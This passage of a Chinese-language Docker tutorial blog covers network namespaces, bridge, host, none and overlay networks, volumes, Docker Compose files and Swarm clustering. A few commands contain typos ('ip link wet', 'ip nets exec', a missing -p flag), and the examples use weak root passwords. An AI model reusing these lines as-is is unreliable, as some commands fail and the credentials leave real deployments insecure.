<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># veth即为端口，首先创建一对连起来的端口</span></span><br><span class="line">sudo ip <span class="built_in">link</span> add veth_test1 <span class="built_in">type</span> veth peer name veth_test2</span><br><span class="line"><span class="comment"># 将端口添加到命名空间中。</span></span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> veth_test1 netns net_test1</span><br><span class="line">sudo ip <span class="built_in">link</span> wet veth_test2 netns net_test2</span><br><span class="line"><span class="comment"># 为端口分配IP地址</span></span><br><span class="line">sudo ip nets <span class="built_in">exec</span> net_test1 ip addr add 192.168.1.1/24 dev veth_test1</span><br><span class="line">sudo ip nets <span class="built_in">exec</span> net_test2 ip addr add 192.168.1.2/24 dev veth_test2</span><br><span class="line"><span class="comment"># 启动命名空间网络</span></span><br><span class="line">sudo ip netns <span class="built_in">exec</span> net_test1 ip <span class="built_in">link</span> <span class="built_in">set</span> dev veth_test1 up</span><br><span class="line">sudo ip netns <span class="built_in">exec</span> net_test2 ip <span class="built_in">link</span> <span class="built_in">set</span> dev veth_test2 up</span><br><span class="line"><span class="comment"># 查看结果</span></span><br><span class="line">sudo ip netns <span class="built_in">exec</span> net_test1 ip <span class="built_in">link</span></span><br><span class="line">sudo ip netns <span class="built_in">exec</span> net_test2 ip <span class="built_in">link</span></span><br><span class="line"><span class="comment"># 会看到网络已经启用了，两个Network命名空间也连起来了</span></span><br></pre></td></tr></table></figure>

<h3 id="Bridge-Network"><a href="#Bridge-Network" class="headerlink" title="Bridge Network"></a>Bridge Network</h3><h4 id="Bridge-Network-原理探索"><a href="#Bridge-Network-原理探索" class="headerlink" title="Bridge Network 原理探索"></a>Bridge Network 原理探索</h4><img src="/2020/02/04/%E8%BF%90%E7%BB%B4/Docker/docker_bridge_network.jpg" class="" title="Docker Bridge Network">

<p>查看Linux本机IP：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<p>可以看到docker0网桥，veth453e607端口以及其他的网络设备。其中：</p>
<ul>
<li>docker0：是一个网桥，是Docker服务端上用于连接其他设备的端口。</li>
<li>veth…：是Docker Container上的端口。它是成对出现的，而它的另一端连接到docker0上。</li>
</ul>
<p>可以使用下面的工具查看这个拓扑结构。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y bridge-utils</span><br><span class="line">brctl show</span><br></pre></td></tr></table></figure>

<h4 id="Bridge-Network-使用"><a href="#Bridge-Network-使用" class="headerlink" title="Bridge Network 使用"></a>Bridge Network 使用</h4><p>查看所有的Docker网络：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker network <span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p>我们这里创建两个容器，并让第二个通过桥接方式连接到第一个容器上。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d --name test1 busybox /bin/sh -c <span class="string">&quot;while true; do sleep 3600; done&quot;</span></span><br><span class="line"><span class="comment"># 使用 --link 连接到另一个容器</span></span><br><span class="line">docker run -d --name test2 --<span class="built_in">link</span> test1 busybox /bin/sh -c <span class="string">&quot;while true; do sleep 3600; done&quot;</span></span><br><span class="line"><span class="comment"># link 命令并不常用</span></span><br></pre></td></tr></table></figure>

<p>这样test2就可以直接通过hostname访问test1，但是test1无法通过hostname访问test1。但是二者可以通过IP访问。</p>
<p>另外，我们也可以通过network方式连接两个容器。创建好的容器默认连接到bridge上。我们新建一个bridge，并让两个容器联入新的bridge。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建网桥</span></span><br><span class="line">docker network create -d bridge test_bridge</span><br><span class="line"><span class="comment"># 查看网桥</span></span><br><span class="line">docker network <span class="built_in">ls</span></span><br><span class="line"><span class="comment"># 新建容器并联入网桥</span></span><br><span class="line">docker run -d --name test3 --network test_bridge busybox /bin/sh -c <span class="string">&quot;while true; do sleep 3600; done&quot;</span></span><br><span class="line"><span class="comment"># 对已经有的容器联入网桥</span></span><br><span class="line">docker network connect test_bridge test2</span><br><span class="line"><span class="comment"># 查看连接状态</span></span><br><span class="line">docker network inspect netword_id</span><br></pre></td></tr></table></figure>

<p>之后，我们还要将端口映射出来。</p>
<p>新建一个Nginx服务器用于测试。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将本地8030端口映射到容器的80端口</span></span><br><span class="line">docker run --name web -d -p 8030:80 nginx</span><br></pre></td></tr></table></figure>

<p>访问本地8030端口即可查看。</p>
<h3 id="Host-Network"><a href="#Host-Network" class="headerlink" title="Host Network"></a>Host Network</h3><p>Host网络是与主机共享一个Network命名空间。启动一个连接Host网络的容器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d --name test4 --network host busybox /bin/sh -c <span class="string">&quot;while true; do sleep 3600; done&quot;</span></span><br></pre></td></tr></table></figure>

<p>这样的容器将直接使用主机上的端口工作。</p>
<h3 id="None-Network"><a href="#None-Network" class="headerlink" title="None Network"></a>None Network</h3><p>None网络是一个孤立网络。启动一个连接None网络的容器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d --name test6 --network none busybox /bin/sh -c <span class="string">&quot;while true; do sleep 3600; done&quot;</span></span><br></pre></td></tr></table></figure>

<p>这个容器将不接入任何网络。</p>
<h3 id="Overlay-Network"><a href="#Overlay-Network" class="headerlink" title="Overlay Network"></a>Overlay Network</h3><p>通过Overlay Network可以实现不同物理机上的Docker容器通信，Docker通过VXLAN技术实现了Docker容器在不同物理机上的通信。这里可以使用etcd实现分布式存储，用于辅助Overlay网络。</p>
<p>使用方法：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker network create -d overlay network_name </span><br></pre></td></tr></table></figure>

<p>这样不论在哪个物理机上操作Docker，都操作的是同一个服务，也就是两台物理机上使用的同一个Docker。</p>
<h2 id="Docker-数据持久化"><a href="#Docker-数据持久化" class="headerlink" title="Docker 数据持久化"></a>Docker 数据持久化</h2><h3 id="Data-Volume"><a href="#Data-Volume" class="headerlink" title="Data Volume"></a>Data Volume</h3><p>Volume有两种，一种是作为本地文件存储的Volume，另一种是通过第三方插件，如NAS，AWS等。</p>
<p>创建的Volume有两种，一种是作为Docker对象呈现，可以用命令查看：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker volume <span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p>另一种是直接挂在到本地目录。</p>
<p>对于前者，首先使用Dockerfile定义Volume：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">VOLUME</span><span class="language-bash"> [<span class="string">&quot;/var/lib/mysql&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>创建的时候再指定参数：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d --name mysql_test -v mysql:/var/lib/mysql -e MYSQL_ALLOW_EMPTY_PASSWORD=<span class="literal">true</span> mysql</span><br></pre></td></tr></table></figure>

<h3 id="Bind-Mouting"><a href="#Bind-Mouting" class="headerlink" title="Bind Mouting"></a>Bind Mouting</h3><p>这种模式不必创建Volume，而是可以直接使用，也就是将目录挂载到本地，实现目录的同步：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -v /home/aaa:/root/aaa</span><br><span class="line"><span class="comment"># 例如</span></span><br><span class="line">docker run -d 80:80 -v $(<span class="built_in">pwd</span>):/usr/share/nginx/html --name web nginx</span><br></pre></td></tr></table></figure>













<h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><p>Docker Compose可以通过脚本快速搭建容器集群，适用于开发环境。</p>
<h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d --name mysql-test -v mysql-data:/var/lib/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=root \</span><br><span class="line">-e MYSQL_DATABASE=wordpress \</span><br><span class="line">mysql</span><br><span class="line"></span><br><span class="line">docker run -d --name wordpress-test \</span><br><span class="line">-e WORDPRESS_DB_HOST=mysql-test:3306 \</span><br><span class="line">--<span class="built_in">link</span> mysql -p 8080:80 wordpress</span><br></pre></td></tr></table></figure>

<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span></span><br><span class="line"><span class="built_in">kill</span></span><br><span class="line">down</span><br><span class="line"></span><br><span class="line">up</span><br><span class="line">start</span><br><span class="line">restart</span><br><span class="line">logs</span><br><span class="line"><span class="built_in">exec</span></span><br><span class="line">stop</span><br></pre></td></tr></table></figure>

<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Docker Compose相当于一个批处理工具，可以定义，管理多个docker应用。</p>
<p>Docker Compse有三大概念：</p>
<ul>
<li>Services：代表一个容器，可以指定Network和Volume。</li>
<li>Network：</li>
<li>Volumes：</li>
</ul>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:9.4</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db-data:/var/lib/postgresql/data</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">back-tier</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">worker:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./worker</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">ENV_A:</span> <span class="string">value_a</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">    <span class="comment"># 不用links，可以用networks</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">back-tier</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">worker_2:</span></span><br><span class="line">      <span class="attr">build:</span></span><br><span class="line">        <span class="attr">context:</span> <span class="string">.</span></span><br><span class="line">        <span class="attr">dockerfile:</span> <span class="string">Dockerfile</span></span><br><span class="line">      <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="number">8000</span><span class="string">:5000</span></span><br><span class="line">      <span class="attr">environment:</span></span><br><span class="line">        <span class="attr">ENV_B:</span> <span class="string">value_b</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">db-data:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">back-tier:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br><span class="line">  <span class="attr">front-tier:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动一个脚本</span></span><br><span class="line">docker-compose -f docker-compose.yml up</span><br><span class="line"><span class="comment"># 如果脚本文件名就是docker-compose.yml，可以简写：</span></span><br><span class="line">docker-compose up</span><br><span class="line"><span class="comment"># 后台执行</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="comment"># 查看服务</span></span><br><span class="line">docker-compose ps   </span><br><span class="line"><span class="comment"># 停止服务</span></span><br><span class="line">docker-compose stop</span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">docker-compose start</span><br><span class="line"><span class="comment"># 停止并删除服务</span></span><br><span class="line">docker-compose down</span><br><span class="line"><span class="comment"># 进入服务</span></span><br><span class="line">docker-compose <span class="built_in">exec</span> name bash</span><br><span class="line"><span class="comment"># 显示运行的进程</span></span><br><span class="line">top</span><br><span class="line"><span class="comment"># 打印日志 -f 跟踪日志</span></span><br><span class="line">logs</span><br><span class="line"><span class="comment"># 运行一次性命令，默认不会绑定服务器端口</span></span><br><span class="line">run</span><br><span class="line">run web bash</span><br><span class="line">run web <span class="built_in">env</span></span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">build</span><br></pre></td></tr></table></figure>

<h3 id="弹性伸缩"><a href="#弹性伸缩" class="headerlink" title="弹性伸缩"></a>弹性伸缩</h3><p>当我们需要做负载均衡时，可以使用伸缩的功能创建多个Web服务器，并用redis来存储客户的sessions。我们可以设计如下的架构：</p>
<p>负载均衡器 $<br>\begin{Bmatrix}<br>Web服务 1 \<br>Web服务 2 \<br>Web服务 3 \<br>\end{Bmatrix}<br>$Redis数据库</p>
<p>命令行方式创建多个服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-compose up --scale service_name=3 -d </span><br></pre></td></tr></table></figure>

<p>使用脚本方式创建负载均衡器，多个Web服务，以及Redis数据库：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">redis:</span> </span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">.</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile</span></span><br><span class="line">    <span class="attr">environment:</span> </span><br><span class="line">      <span class="attr">REDIS_HOST:</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">lb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">dockercloud/haproxy</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">web</span></span><br><span class="line">    <span class="attr">port:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run/docker.sock:/var/run/docker.sock</span></span><br></pre></td></tr></table></figure>

<p>启用脚本：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<p>将web服务增加到3个：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-compose up --scale web=3 -d </span><br></pre></td></tr></table></figure>



<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>环境变量：在同一目录里下建立<code>.env</code>文件，用于设置环境变量。在<code>docker-compose.yml</code>中启用环境变量如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">environment:</span> </span><br><span class="line">    <span class="comment"># 本地赋值</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">REDIS_HOST=redis</span></span><br><span class="line">    <span class="comment"># 引用外部环境变量</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">DEBUG</span></span><br><span class="line">    <span class="attr">env_file:</span></span><br><span class="line">    <span class="comment"># 使用环境变量文件</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">web-variables.env</span></span><br></pre></td></tr></table></figure>

<p>查看一个服务使用了哪些环境变量</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-compose run web <span class="built_in">env</span></span><br></pre></td></tr></table></figure>

<p>内置环境变量</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">COMPOSE_PROJECT_NAME</span><br><span class="line">COMPOSE_FILE</span><br><span class="line">DOCKER_HOST - defaults to unix:///var/run/docker.sock，容器内的程序通过此套接字与Docker守护进程通信</span><br></pre></td></tr></table></figure>

<h3 id="预设与多模块"><a href="#预设与多模块" class="headerlink" title="预设与多模块"></a>预设与多模块</h3><p>如果想要给<code>docker-compose.yml</code>配置不同环境下，启动不同的容器的设置，可以使用<code>profile</code>。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.9&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">frontend:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">frontend</span></span><br><span class="line">    <span class="attr">profiles:</span> [<span class="string">&quot;frontend&quot;</span>]</span><br><span class="line"></span><br><span class="line">  <span class="attr">phpmyadmin:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">phpmyadmin</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">profiles:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">debug</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">backend:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">backend</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql</span></span><br></pre></td></tr></table></figure>

<p>当启动容器时，指定<code>profile</code>，就可以开启特定的几个服务。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-compose --profile frontend --profile debug up</span><br></pre></td></tr></table></figure>

<p>默认情况下，Compose会读取两个文件：<code>docker-compose.yml</code>和<code>docker-compose.override.yml</code>，同时合并两个文件的结果。如果有其他文件，可以用<code>-f</code>来合并每个文件。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d</span><br></pre></td></tr></table></figure>

<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>每一个Compose对应一个网络。同一个Compose下的容器可以通过容器名互相访问。</p>
<p>也可以使用Links为被连接的容器起别名。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.9&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;db:database&quot;</span></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres</span></span><br></pre></td></tr></table></figure>

<p>也可以使用多网络，更改网络驱动，连接外部网络等。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.9&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">proxy:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./proxy</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">frontend</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./app</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">frontend</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">backend</span></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">backend</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">frontend:</span></span><br><span class="line">    <span class="comment"># Use a custom driver</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">custom-driver-1</span></span><br><span class="line">  <span class="attr">backend:</span></span><br><span class="line">    <span class="comment"># Use a custom driver</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">custom-driver-2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或配置默认网络</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">default:</span></span><br><span class="line">    <span class="comment"># Use a custom driver</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">custom-driver-1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">default:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">my-pre-existing-network</span></span><br></pre></td></tr></table></figure>

<h3 id="控制启动顺序"><a href="#控制启动顺序" class="headerlink" title="控制启动顺序"></a>控制启动顺序</h3><p>启动顺序由<code>depends_on</code>，<code>links</code>，<code>volumes_from</code>，<code>network_mode: &quot;service:...&quot;</code>决定。</p>
<p>depends_on：当依赖容器启动后再启动自己。</p>
<h2 id="Docker-Swarm"><a href="#Docker-Swarm" class="headerlink" title="Docker Swarm"></a>Docker Swarm</h2><p>Docker Swarm可以快速搭建容器集群，适用于生产环境。在生产环境中，为了保障服务的正常使用，我们决不能停止当前的服务。不仅如此，我们还需要实时监控服务的状态，甚至在宕机时能够自动恢复。另外，服务还要有足够的安全性，防止数据泄露，扛得住网络攻击。</p>
<h3 id="Swarm-架构"><a href="#Swarm-架构" class="headerlink" title="Swarm 架构"></a>Swarm 架构</h3><img src="/2020/02/04/%E8%BF%90%E7%BB%B4/Docker/swarm.jpg" class="" title="Swarm 架构">

<p>在Swarm中有两种角色。一种是Worker，一种是Manager。Manager是管理Worker的节点，可以有多个，且他们之间数据可以同步，同步使用Raft，。Worker是处理数据的节点，也可以有多个，他们之间通过Gossip network通信。</p>
<img src="/2020/02/04/%E8%BF%90%E7%BB%B4/Docker/swarm_2.jpg" class="" title="Service 与 Replicas">

<p>在Swarm中还定义了Service与Replicas。Service代表了一种服务，而Replicas则是服务下属的节点，一个服务可以有多个下属的节点。每一个Replica是一个容器。</p>
<h3 id="创建集群"><a href="#创建集群" class="headerlink" title="创建集群"></a>创建集群</h3><p>首先创建三台虚拟机，命名为Manager，Worker1，Worker2。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建虚拟机</span></span><br><span class="line">docker-machine create swarm-manager</span><br><span class="line">docker-machine create swarm-worker1</span><br><span class="line">docker-machine create swarm-worker2</span><br><span class="line"><span class="comment"># 查看虚拟机IP，例如得到ManagerIP为192.168.205.10</span></span><br><span class="line">docker-machine <span class="built_in">ls</span></span><br><span class="line"><span class="comment"># 登录Manager</span></span><br><span class="line">docker-machine ssh swarm-manager</span><br></pre></td></tr></table></figure>

<p>在Manager节点上执行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker swarm init --advertise-addr=192.168.205.10</span><br></pre></td></tr></table></figure>

<p>之后会返回一条指令，这条指令是给要加入Manager的Worker节点使用的：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker swarm <span class="built_in">join</span> --token SWMTKN-1-3cv6sadfwe...asfwef 192.168.205.10:2377</span><br></pre></td></tr></table></figure>

<p>进入Worker1节点，执行刚刚得到的指令，即可加入集群。</p>
<p>在Manager节点可以查看Worker情况：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker node <span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<h3 id="横向扩展"><a href="#横向扩展" class="headerlink" title="横向扩展"></a>横向扩展</h3><p>横向扩展是指通过创建多个服务来做负载均衡，以保证服务的可靠性。依然是上面的三个虚拟机的集群，在Manager上搭建服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker service create --name demo busyBox sh -c <span class="string">&quot;while true; do sleep 3600; done&quot;</span></span><br></pre></td></tr></table></figure>

<p>查看刚刚搭建的服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker service ps demo</span><br></pre></td></tr></table></figure>

<p>可以看到一个REPLICAS属性，这个属性就是扩展的节点数。下面我们扩展这个服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker service scale demo=5</span><br></pre></td></tr></table></figure>

<p>再次查看操作结果：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker service ps demo</span><br></pre></td></tr></table></figure>

<p>会发现5个服务被平均分配到3台虚拟机上了。如果某个服务宕机了，Swarm会自动新建一个节点，修复集群。</p>
<p>停止服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker service <span class="built_in">rm</span> demo</span><br></pre></td></tr></table></figure>

<h3 id="在线更新"><a href="#在线更新" class="headerlink" title="在线更新"></a>在线更新</h3><p>为了保证更新过程，服务不宕机，Swarm提供了动态更新的功能。</p>
<p>首先创建一个overlay网络：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker network create -d overlay demo</span><br></pre></td></tr></table></figure>

<p>在这个网络上创建一个服务，这个服务是一个旧版的Nginx，一会我们通过动态更新换为最新版Nginx。更新之前，首先保证服务节点数大于一个：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker service create --name web --publish 8080:5000 --network demo nginx:1.16.1</span><br><span class="line">docker service scale web=4</span><br></pre></td></tr></table></figure>

<p>更新Image：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker service update --image nginx:latest web</span><br></pre></td></tr></table></figure>

<p>更新端口：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker service update --publish-rm 8080:5000 --publish-add 8088:5000 web</span><br></pre></td></tr></table></figure>

<p>在更新过程中，会有旧版和新版同时服务的状况。</p>
<h3 id="搭建WordPress"><a href="#搭建WordPress" class="headerlink" title="搭建WordPress"></a>搭建WordPress</h3><p>使用WordPress，需要有WordPress和MySQL两个服务。</p>
<p>首先在Manager节点，创建Overlay网络：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker network create -d overlay demo</span><br></pre></td></tr></table></figure>

<p>创建服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker service create --name mysql \</span><br><span class="line">--<span class="built_in">env</span> MYSQL_ROOT_PASSWORD=root \</span><br><span class="line">--<span class="built_in">env</span> MYSQL_DATABASE=wordpress \</span><br><span class="line">--network demo \</span><br><span class="line">--mount <span class="built_in">type</span>=volume,<span class="built_in">source</span>=mysql-data,destination=/var/lib/mysql \</span><br><span class="line">mysql</span><br><span class="line"></span><br><span class="line">docker service create --name wordpress -p 80:80 \</span><br><span class="line">--<span class="built_in">env</span> WORDPRESS_DB_PASSWORD=root \</span><br><span class="line">--<span class="built_in">env</span> WORDPRESS_DB_HOST=mysql \</span><br><span class="line">--network demo \</span><br><span class="line">wordpress</span><br></pre></td></tr></table></figure>

<p>之后三个节点的IP地址都可以访问WordPress服务了。</p>
<h3 id="DNS-服务"><a href="#DNS-服务" class="headerlink" title="DNS 服务"></a>DNS 服务</h3><p>在Docker内部拥有一个DNS服务，这个服务维护了每一个服务以及其服务IP。如果这个服务有3个节点，那么这个服务就会另外有3个IP，对应3个容器的IP。也就是说，这个服务一共有4个IP：1个虚拟的IP用于对外提供服务，这个IP会保持不变；另外还有3个用于对应容器，可以随时扩展收缩。</p>
<p>我们可以通过访问虚拟机集群，不论访问哪个虚拟机的IP，都能访问容器中的服务。在这个过程中，Docker DNS会自动为我们寻找需要的服务和它的虚拟IP。但是我们请求这个服务，最终会看到容器所在的虚拟机的主机名。</p>
<p>对比Docker Overlay网络，Overlay实现了多个虚拟机之间的容器通信，使用的技术是VXLAN Tunnel；而服务之间则是通过虚拟IP，基于Docker DNS通信，使用LVS（Linux Virtual Server）技术。</p>
<h3 id="使用-Stack-通过-Docker-Compose-部署服务"><a href="#使用-Stack-通过-Docker-Compose-部署服务" class="headerlink" title="使用 Stack 通过 Docker Compose 部署服务"></a>使用 Stack 通过 Docker Compose 部署服务</h3><p>使用Stack通过Docker Compose更新服务，首先要确保image不能是在本脚本build，而是必须使用已经build好的image。</p>
<p>deploy属性指定了更新的策略，包括部署数量，部署方式等。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">redis:</span> </span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:alpine</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;6379&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">frontend</span></span><br><span class="line">    <span class="attr">deploy:</span> </span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">      <span class="attr">update_config:</span> </span><br><span class="line">        <span class="attr">parallelism:</span> <span class="number">2</span></span><br><span class="line">        <span class="attr">delay:</span> <span class="string">10s</span></span><br><span class="line">      <span class="attr">restart_policy:</span></span><br><span class="line">        <span class="attr">condition:</span> <span class="string">on-failure</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">worker:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">web</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">frontend</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">backend</span></span><br><span class="line">    <span 